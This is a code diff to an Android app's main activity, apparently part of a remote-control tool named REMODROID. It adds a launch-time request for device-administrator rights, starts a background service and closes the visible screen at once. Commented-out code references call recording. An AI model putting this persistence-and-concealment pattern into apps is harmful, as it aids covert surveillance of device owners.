@@ -2,10 +2,15 @@ package com.remo;
 
 import android.app.Activity;
 //import android.content.Context;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.os.StrictMode;
 import android.util.Log;
+import com.remo.features.broadcastReceivers.DeviceAdmin;
 
 public class MainActivity extends Activity {
 
@@ -24,8 +29,6 @@ public class MainActivity extends Activity {
                 });
 
 
-
-
 //        CallRecorder phoneListener = new CallRecorder();
 //        TelephonyManager telephonyManager = (TelephonyManager) this
 //                .getSystemService(Context.TELEPHONY_SERVICE);
@@ -33,9 +36,39 @@ public class MainActivity extends Activity {
 //                PhoneStateListener.LISTEN_CALL_STATE);
 
 
+
+//        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+//        ComponentName demoDeviceAdmin = new ComponentName(this, DeviceAdmin.class);
+//        Log.e("DeviceAdminActive==", "" + demoDeviceAdmin);
+//
+//        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);// adds new device administrator
+//        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, demoDeviceAdmin);//ComponentName of the administrator component.
+//        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+//                "Disable app");//dditional explanation
+//        startActivityForResult(intent, 0);
+
+
+        try {
+            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+            ComponentName componentName = new ComponentName(this, DeviceAdmin.class);
+            if (!devicePolicyManager.isAdminActive(componentName)) {
+                Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
+                intent.putExtra("android.app.extra.DEVICE_ADMIN", componentName);
+                startActivity(intent);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+
+
+
+
+
+
+
+
         startService(new Intent(getApplicationContext(), MainService.class));
-
-
 
 //        String[] s = getClassesOfPackage(Feature.class.getPackage().getName());
 //        for(String c: s){
@@ -96,6 +129,9 @@ public class MainActivity extends Activity {
 //        }catch (Exception ex){
 //            Log.e("REMODROID", "Jsoup Error "+ex.getMessage());
 //        }
+
+
+
         onBackPressed();
 
     }
